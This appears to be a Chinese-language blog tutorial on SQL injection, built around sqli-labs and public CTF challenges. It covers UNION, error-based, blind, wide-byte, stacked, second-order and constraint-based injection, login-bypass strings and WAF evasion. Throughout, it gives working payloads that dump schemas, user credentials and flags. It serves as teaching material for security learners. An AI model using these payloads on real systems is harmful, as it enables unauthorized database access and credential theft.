-<p>把之前传入的 <code>1&#39;</code>  带入 <code>$id</code> 看看结果<br><code>SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1</code></p>
-<p>会发现传入的单引号把原本已经存在的那一个左单引号闭合掉了，那多出来的那一个右单引号就出了问题了</p>
-<p>使用  and 1=1–+<br>mysql 中的注释有两种，一个是 <code>--空格</code>，一个是 <code>#</code><br><a href="https://blog.csdn.net/xiayun1995/article/details/86500605" target="_blank" rel="noopener">sql 注入中的注释符的解释</a></p>
-<p><code>&#39;order by 4--+</code> 得到列数<br>order by  是用来排序的，后面可以跟着列数，比如 order by 1  是按照第一列来排序，当使用大于数据表有的列数的时候就肯定会报错了，这样就可以用来判断有几列</p>
-<p><code>-1&#39;union select 1,2,3--+</code>  联合查询，一般用来检查什么地方可以回显</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472008439-91aa61d7-2a5e-4929-afb0-64fe8df559bd.png#align=left&display=inline&height=220&name=image.png&originHeight=440&originWidth=1376&size=70475&status=done&style=none&width=688" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>显示出 2,3，说明这里 2 与 3 的位置会被打印出来，我们就可以把想要查询的放在这里两个位置让他显示给我们</p>
-<p>这里介绍几个字符连接函数：</p>
-<ol>
-<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
-<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
-<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据<br>因为我们查询到的数据不是只有一个，所以需要用连接函数把他们连接成一串才能显示出来</li>
-</ol>
-<p><code>union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
-<p>这句话把查询到的  <code>schema_name（数据库名）</code>  连成了一串字符串在 name 的地方显示出来<br>从 information_schema 中的 schemata  这个表里面查询的，中间用  <code>.</code> 连接起来，所以上面那一条语句查询了所有数据库名并显示在  name（2） 的地方</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474481281-18fecc49-5917-4e34-a730-d5b0054557ab.png#align=left&display=inline&height=208&name=image.png&originHeight=415&originWidth=1349&size=72758&status=done&style=none&width=674.5" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>那接下来只要替换 2  处的查询内容与后面的 from  的表就可以查询出所有的表名与列名了</p>
-<p>查询所有表名：<br><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474896594-dfc43372-dd3b-47a8-9037-f0460bef89c1.png#align=left&display=inline&height=207&name=image.png&originHeight=413&originWidth=1244&size=55397&status=done&style=none&width=622" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>查询所有列名：<br><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474926265-8d50bcaf-9796-405d-bed7-639c0849b1dd.png#align=left&display=inline&height=193&name=image.png&originHeight=385&originWidth=1254&size=54980&status=done&style=none&width=627" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>那么已经知道所有的表名跟列名了，怎么去查询表中的数据呐？<br><code>union select 1,username,password from users where id=6--+</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476264699-97a5fce4-fbb6-4551-8126-0ceb79276812.png#align=left&display=inline&height=211&name=image.png&originHeight=421&originWidth=1070&size=54460&status=done&style=none&width=535" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>自己根据源代码尝试做一下前四关，语句基本一样，只要改一个地方就可以<br>源代码在解压出来的文件夹中的 Less 开头的里面的 index.php</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476353408-77d91a36-00ca-415c-9dce-2140ab497eed.png#align=left&display=inline&height=296&name=image.png&originHeight=592&originWidth=623&size=69060&status=done&style=none&width=311.5" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>hint：只需要注意这个地方就可以了</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476448206-c9771d69-5745-4a2e-9697-dc7a7c661f05.png#align=left&display=inline&height=71&name=image.png&originHeight=142&originWidth=588&size=33010&status=done&style=none&width=294" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>rand()产生 0-1 之间的随机数<br>floor()向下取整</p>
-<h2 id="原理讲解"><a href="#原理讲解" class="headerlink" title="原理讲解"></a>原理讲解</h2><p>假设有一个 users 表</p>
-<table>
-<thead>
-<tr>
-<th>user_id</th>
-<th>user_name</th>
-<th>password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>yichen</td>
-<td>6666666</td>
-</tr>
-<tr>
-<td>2</td>
-<td>chenaa</td>
-<td>7777777</td>
-</tr>
-<tr>
-<td>3</td>
-<td>tttttest</td>
-<td>8888888</td>
-</tr>
-<tr>
-<td>4</td>
-<td>flaggg</td>
-<td>9999999</td>
-</tr>
-</tbody></table>
-<p>进行如下查询：<br>select count(<em>),(concat(floor(rand(0)</em>2),‘@’,(select version())))x from users group by x</p>
-<p>floor(rand(0)*2)产生的结果为固定的 011011</p>
-<p>进行 group by 时会产生一个新的虚拟表，group by 时他后面的语句会运算两次，（对比，插入）<br>刚开始虚拟表是空的：</p>
-<table>
-<thead>
-<tr>
-<th>x</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Null</td>
-<td>Null</td>
-</tr>
-</tbody></table>
-<p>现在当去扫描原始表的第一项时 floor(rand(0)*2)第一次运算，结果为 0，当插入的时候会进行第二次运算这时候就变成了 1，插入后表的内容就变成了</p>
-<table>
-<thead>
-<tr>
-<th>x</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a href="mailto:1@5.7.19">1@5.7.19</a></td>
-<td>1</td>
-</tr>
-</tbody></table>
-<p>当扫描第二项 floor(rand(0)<em>2)得到 1，但是<a href="mailto:1@5.7.19">1@5.7.19</a>已经存在了，不需要插入，只需要改 count(</em>)</p>
-<table>
-<thead>
-<tr>
-<th>x</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a href="mailto:1@5.7.19">1@5.7.19</a></td>
-<td>2</td>
-</tr>
-</tbody></table>
-<p>扫描第三项时 floor(rand(0)<em>2)得到 0，表中没有，需要插入，但是插入的时候进行了第二次运算，floor(rand(0)</em>2)成了 1</p>
-<p>但是虚拟表中已经有了<a href="mailto:1@5.7.19">1@5.7.19</a>，x 作为主键，是不允许存在相同的，所以就报错了</p>
-<h2 id="其他函数介绍"><a href="#其他函数介绍" class="headerlink" title="其他函数介绍"></a>其他函数介绍</h2><p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
-<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
-<p>上面两个需要传入 xpath 格式的字符串，但是传入的却不符合，但可以执行，所以报错</p>
-<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>mysql 重复特性，此处重复了 version，所以报错，有些地方不管用</p>
-<p>如果等号“=”被禁用了，可以使用 like 或&lt;&gt;替换，&lt;&gt;意思是不等于，在前面加上！意思就是等于，<br>如：<br><code>select 1,group_concat(tablem_name) where !(table_schema &lt;&gt; security)</code></p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>实验吧题目：<a href="">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
-<blockquote>
-<p>爆库：username=’and updatexml/<em>&amp;password=</em>/(1,concat(0x23,database()),3) and ‘1</p>
-<p>爆表：username=’and updatexml/<em>&amp;password=</em>/(1,concat(0x23,(select group_concat(table_name)from information_schema.tables where !(table_schema&lt;&gt;database()))),3) and ‘1</p>
-<p>爆列：username=’and updatexml/&amp;password=/(1,concat(0x23,(select group_concat(column_name)from information_schema.columns where !(table_schema&lt;&gt;database()) and !(table_name&lt;&gt;’ffll44jj’) )),3) and ‘1</p>
-<p>爆字段：username=’ or updatexml/<em>&amp;password=1</em>/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or ‘</p>
-</blockquote>
-<h1 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h1><h2 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h2><p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))<br>if 判断语句，第一个参数（判断语句）为假，返回第三个参数 sleep(5)，第一个参数为真，返回第二个参数 0<br>sleep 语句会等规定的秒数</p>
-<p>(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(‘true’)), false))<br>benchmark(count,expr)用来执行 expr 表达式 count 次数，执行一个函数若干次就会延长时间，这样就可以用来代替 sleep 函数<br>这种方法有个听着贼牛逼的名字：<strong>侧信道攻击</strong></p>
-<h2 id="截取函数"><a href="#截取函数" class="headerlink" title="截取函数"></a>截取函数</h2><p>substr(string,start,length)        查看 string 从第 start 开始的 length 位<br>substr(DATABASE(),1,1)&gt;’a’      数据库名第一位<br>substr(DATABASE(),1,2)&gt;’ad’    数据库名前两位</p>
-<p>substring(str,start,len)    等价于   substring(str from start for len)  这样就可以不用逗号进行查询<br>防止逗号被过滤掉</p>
-<p>substring_index(str,delim,count)      被截取的字段，关键字，关键字出现的次数<br>比如 substring_index(‘aaabbbccc’,’b’,2)     b 出现第二次之前的东西</p>
-<p>select case when 条件<br>select case when username=’admin’ then ‘aaa’ else(sleep(3)) end from user<br>在 if 判断中的逗号被过滤，用这个代替</p>
-<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a><br>(题目环境崩了)</p>
-<h1 id="bool-型盲注"><a href="#bool-型盲注" class="headerlink" title="bool 型盲注"></a>bool 型盲注</h1><h2 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h2><p>mid(str,start,len)<br>left(str,len)<br>right(str,len)</p>
-<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p>106.12.37.37:8080</p>
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="常见几个-url-转码"><a href="#常见几个-url-转码" class="headerlink" title="常见几个 url 转码"></a>常见几个 url 转码</h2><blockquote>
-<p><strong>空格        %20</strong> &gt; <strong>‘             %27</strong> &gt; <strong>#            %23</strong> &gt; <strong>/            %5C</strong> &gt; <strong>%09       TAB 键（水平）</strong> &gt; <strong>%0a        新建一行</strong> &gt; <strong>%0b       TAB 键（垂直）</strong> &gt; <strong>%0c        新的一页</strong> &gt; <strong>%0d       return 功能</strong> &gt; *<em>%a0        空格<br>*</em></p>
-</blockquote>
-<h2 id="php-函数-addslashes"><a href="#php-函数-addslashes" class="headerlink" title="php 函数 addslashes()"></a>php 函数 addslashes()</h2><p>作用：使用反斜线引用字符串</p>
-<p>对以下生效生效：</p>
-<blockquote>
-<p><strong>单引号：’</strong> &gt; <strong>反斜线：/</strong> &gt; <strong>双引号：”</strong> &gt; <strong>空值：NULL</strong></p>
-</blockquote>
-<p>它会在这些之前加上反斜线，这样单引号就是字符串里面的一个，而没有单引号在代码中的作用</p>
-<p>如何逃逸？</p>
-<ol>
-<li>在反斜线之前再加一个反斜线，这样就把反斜线给转义了</li>
-<li><strong>把反斜线弄没（即宽字节注入）</strong></li>
-</ol>
-<h2 id="宽字节手工注入"><a href="#宽字节手工注入" class="headerlink" title="宽字节手工注入"></a>宽字节手工注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 url 编码之后，如果%后面的两个字符的值（十六进制形式）超过了 128（ascii 码最大表示），会默认为 GBK 形式，而 Mysql 在进行编码是认为 GBK 形式两个字符才算一个汉字</p>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>单引号被反斜线转义：<br><code>&#39; --&gt; \&#39; --&gt; %5C%27</code><br>当在单引号之前加上%aa 时<br><code>%aa&#39; --&gt; %aa\&#39; --&gt; ``%aa%5C``%27</code><br>会认为%aa%5C 是一对</p>
-<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>教程里会用到一些简单的 sql 手工注入知识，sqli-labs 靶场自己搭建一个环境，先做 1-4 应该就能明白他是在干啥<br>链接：<a href="https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q" target="_blank" rel="noopener">https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q</a><br>提取码：a4oy</p>
-<p>南邮新平台：<a href="https://cgctf.nuptsast.com/challenges" target="_blank" rel="noopener">https://cgctf.nuptsast.com/challenges</a><br>对应题目地址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
-<blockquote>
-<p>爆库：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,group_concat(schema_name) from information_schema.schemata –+</p>
-<p>爆表：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572 –+</p>
-<p>爆列：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,group_concat(column_name) from information_schema.columns where table_name=0x67626b73716c69 –+</p>
-<p>爆字段：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,flag from gbksqli –+</p>
-</blockquote>
-<h1 id="基于约束的-SQL-攻击"><a href="#基于约束的-SQL-攻击" class="headerlink" title="基于约束的 SQL 攻击"></a>基于约束的 SQL 攻击</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在 MySQL 进行数据插入的时候会把空格忽略掉，而且超过 30（也可能是别的数）个以后的也会舍弃<br>如果数据库中存在：<br><code>username：admin</code><br><code>password：password</code><br>再插入：<br><code>username：admin 空格*30 1</code><br><code>password：666</code><br>这样数据库里就会有以下数据：</p>
-<table>
-<thead>
-<tr>
-<th>username</th>
-<th>password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>admin</td>
-<td>password</td>
-</tr>
-<tr>
-<td>admin</td>
-<td>666</td>
-</tr>
-</tbody></table>
-<p>虽然插入的时候用户名为  username：admin  空格*30  1<br>但是 MySQL 进行检索的时候会认为时 admin（忽略空格，忽略 30 字以后的）<br>这样就意味着可以自定义一个 admin 的密码进行登录</p>
-<h2 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h2><p>bugku 题目：<a href="https://ctf.bugku.com/challenges#login1(SKCTF)" target="_blank" rel="noopener">https://ctf.bugku.com/challenges#login1(SKCTF)</a></p>
-<h1 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order_by 注入"></a>order_by 注入</h1><h2 id="order-by-语法格式"><a href="#order-by-语法格式" class="headerlink" title="order_by 语法格式"></a>order_by 语法格式</h2><p>order_by {column_name[ASC|DESC]}[,n]<br>默认按照升序进行排序，在不知道列名的情况下可以通过列的序号代替相应的列<br>注意：order_by 不能运算，如 order_by 1+1  与 order_by 2  是不一样的</p>
-<h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p><a href="http://chall.tasteless.eu/level1/index.php?dir=ASC" target="_blank" rel="noopener">http://chall.tasteless.eu/level1/index.php?dir=ASC</a></p>
-<h1 id="insert-注入"><a href="#insert-注入" class="headerlink" title="insert 注入"></a>insert 注入</h1><h2 id="insert：插入"><a href="#insert：插入" class="headerlink" title="insert：插入"></a>insert：插入</h2><p>报错语法：(报错就能把数据库带出来)也能插进去。<br>insert into data1 (id,name,year) values (‘’,’attacker’ or updatexml(1,concat(0x7e,database()),0),10);</p>
-<h2 id="update-更新"><a href="#update-更新" class="headerlink" title="update:更新"></a>update:更新</h2><p>报错语法：(报错就能把数据库带出来)<br>update data1 set year=11 or updatexml(1,concat(0x7e,database()),0) where id =7;</p>
-<h2 id="delete-删除"><a href="#delete-删除" class="headerlink" title="delete:删除"></a>delete:删除</h2><p>(报错就能把数据库带出来)<br>delete from data1 where id =7 or updatexml(1,concat(0x7e,database()),0);</p>
-<h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><p><a href="http://chall.tasteless.eu/level15/index.php" target="_blank" rel="noopener">http://chall.tasteless.eu/level15/index.php</a></p>
-<h1 id="DESC-注入"><a href="#DESC-注入" class="headerlink" title="DESC 注入"></a>DESC 注入</h1><p>{describe|desc} tbl<em>name [col_name |wild]<br>describe 提供有关一个表的列信息。col_name 可以是一个列名或是一个包含 sql 通配符字符 “%”和“</em>”的字符串。</p>
-<p>mysql 中反引号：``  用于保留字符</p>
-<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p>web.jarvisoj.com:32794<br>提示：源码：<a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p>
-<blockquote>
-<p>爆库：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select database() limit 1 offset 1</p>
-<p>爆表：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1 offset 1</p>
-<p>爆列：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1 offset 1</p>
-<p>爆字段：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select flagUwillNeverKnow from secret_flag limit 1 offset 1</p>
-</blockquote>
-<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>二次排序注入也成为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。<br>二次排序注入思路：</p>
-<ol>
-<li>黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</li>
-<li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li>
-<li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li>
-<li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库 中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。</li>
-<li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li>
-</ol>
-<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，会一起执行</p>
-<p>2019 强网杯题目：随便注<br><code>inject=1&#39;; rename table</code>words<code>to</code>words1<code>;rename table</code>1919810931114514<code>to</code>words<code>;alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code></p>
-<p><code>rename table</code>words<code>to</code>words1<code>;</code>    把查询的表明改成 words1<br><code>rename table</code>1919810931114514<code>to</code>words<code>;</code>  把希望查询的表明改成 words<br><code>alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code>    把 id  与 flag  值互换</p>
-<h1 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h1><p>常用：</p>
-<p>admin’ #<br>‘+’<br>‘+’<br>0<br>Aaa’=’<br>原理：<br>单引号闭合，井号注释<br><strong>select * from admin where username=’admin’ #</strong>‘ and password =’’</p>
-<p>Mysql 里 select ‘aaaaa’+1  返回的是 1，会把单引号里面的当成 0<br><strong>select * from admin where username=’’+’’ and password =’’+’’</strong><br><em>*select \</em> from admin where username=0 and password =0<br>**都可以爆出数据</p>
-<p>先 username=Aaa 为假，再与’ ‘比较为真<br><strong>select * from admin where username=’Aaa’=’’ and password =’Aaa’=’’</strong></p>
-<p>sql 注入相关文件:<a href="https://www.yuque.com/attachments/yuque/0/2019/txt/376509/1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt?_lake_card=%7B%22uid%22%3A%221563238369116-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2019%2Ftxt%2F376509%2F1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt%22%2C%22name%22%3A%22A1-SQL%E6%B3%A8%E5%85%A5.txt%22%2C%22size%22%3A4612%2C%22type%22%3A%22text%2Fplain%22%2C%22ext%22%3A%22txt%22%2C%22progress%22%3A%7B%22percent%22%3A0%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22IuS9W%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">A1-SQL 注入.txt</a></p>
-<p>各数据库注入相关:<a href="https://www.netsparker.com/" target="_blank" rel="noopener">https://www.netsparker.com/</a></p>
-<h1 id="注入-waf-绕过"><a href="#注入-waf-绕过" class="headerlink" title="注入 waf 绕过"></a>注入 waf 绕过</h1><h3 id="绕过引号限制"><a href="#绕过引号限制" class="headerlink" title="绕过引号限制"></a>绕过引号限制</h3><p>– hex 编码<br>SELECT _ FROM Users WHERE username = 0x61646D696E<br>– char() 函数<br>SELECT _ FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</p>
-<h3 id="绕过字符串黑名单"><a href="#绕过字符串黑名单" class="headerlink" title="绕过字符串黑名单"></a>绕过字符串黑名单</h3><p>SELECT ‘a’ ‘d’ ‘mi’ ‘n’;<br>SELECT CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>SELECT CONCAT_WS(‘’, ‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>SELECT GROUP_CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>使用  <code>CONCAT()</code>  时，任何个参数为 null，将返回 null，推荐使用  <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code> 函数第一个参数表示用哪个字符间隔所查询的结果。</p>
 ]]></content>
   </entry>
 </search>
